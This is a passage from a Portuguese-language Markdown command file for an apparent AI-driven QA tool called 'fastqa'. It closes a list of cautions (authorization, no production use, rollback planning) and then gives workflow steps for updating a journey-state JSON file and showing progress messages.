3. **MONITORAMENTO**: Monitore logs do sistema durante execução
4. **RESTAURAÇÃO**: Tenha plano de rollback pronto
5. **DOCUMENTAÇÃO**: Documente todos os achados para development team
6. **ÉTICA**: Nunca use para fins maliciosos ou sem autorização
7. **AMBIENTE**: JAMAIS execute em produção

---

**Última Atualização:** 20 de Fevereiro de 2026  
**Versão:** 1.0

---

## 🔄 Continuidade da Jornada

Após concluir este comando, siga as regras de continuidade:

1. **Leia** `fastqa/scripts/journey_state.json`
2. **Se `active_journey` não é null** (jornada ativa):
   - Marque o step atual como `"completed"` no array `steps`
   - Adicione artefatos produzidos ao `artifacts_produced`
   - Atualize `context` com IDs relevantes
   - Incremente `current_step_index`
   - Atualize `updated_at` com timestamp atual
   - Grave o arquivo `journey_state.json`
   - **Se há próximo step:** Exiba mensagem de continuidade:
     ```
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     {ícone} {nome_jornada} — Step {N}/{total} ✅ Concluído!
     📍 Próximo: @fastqa:{próximo_comando}
        "{descrição_do_próximo}"
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     ```
   - **Se próximo step é condicional:** Avaliar condição. Se não atendida, marcar como `"skipped"` e avançar.
   - **Se era o último step:** Exibir resumo final da jornada com artefatos e duração.
3. **Se `active_journey` é null** (sem jornada ativa):
   - Consulte a tabela de detecção (JOURNEYS.md §6) para identificar jornadas compatíveis
   - Exiba sugestão:
     ```
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     💡 Este comando faz parte da jornada **{nome}**.
        Deseja ativar? Execute @fastqa /journey
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     ```
